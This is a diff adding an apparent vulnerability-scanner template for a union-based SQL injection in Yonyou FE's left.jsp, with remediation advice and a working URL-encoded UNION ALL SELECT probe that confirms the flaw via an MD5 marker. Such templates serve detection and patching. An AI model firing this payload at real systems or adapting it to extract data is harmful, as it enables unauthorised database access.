@@ -1,0 +1,38 @@
+id: yonyou_fe-sqli-left
+info:
+  name: Yonyou FE left.jsp Union-based SQL Injection
+  author:
+  - 折跃
+  description: |-
+    Yonyou FE Collaboration Office Platform left.jsp SQL injection vulnerability
+    The FE business collaboration platform has a SQL injection vulnerability. An attacker can exploit it to execute SQL statements to view, add, modify, or delete data in the database.
+  severity: high
+  remediation: |-
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+    https://www.yonyou.com/
+
+    Temporary fix:
+    1. Use prepared statements. When using PDO, do not directly concatenate variables into PDO statements. Use the parameterized query interface provided by the database for all query statements; parameterized statements use parameters instead of embedding user-supplied variables into SQL statements. Almost all database systems currently provide a parameterized SQL execution interface, which can very effectively prevent SQL injection attacks.
+    2. Escape or encode special characters that enter the database, or convert their encoding.
+    3. Confirm the type of each data value; for example, numeric data must be numeric, and corresponding database storage fields must be of integer type.
+    4. Strictly limit data lengths, which to some extent prevents overly long SQL injection statements from executing correctly.
+    5. Unify the encoding of every data layer of the website; UTF-8 is recommended for all. Inconsistent encoding between layers may allow some filtering models to be bypassed.
+    6. Strictly limit the database operation privileges of website user accounts, granting only the minimum privileges needed for their work, thereby maximizing the reduction of harm caused by injection attacks to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors or field mismatches, to prevent attackers from using these error messages to make judgments.
+    8. Filter dangerous characters, for example: use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if any are matched.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'202cb962ac59075b964b07152d234b70')
+  path:
+  - '{{BaseURL}}/sys/left.jsp?lx=1%27%20UNION%20ALL%20SELECT%20null%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--%20-'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
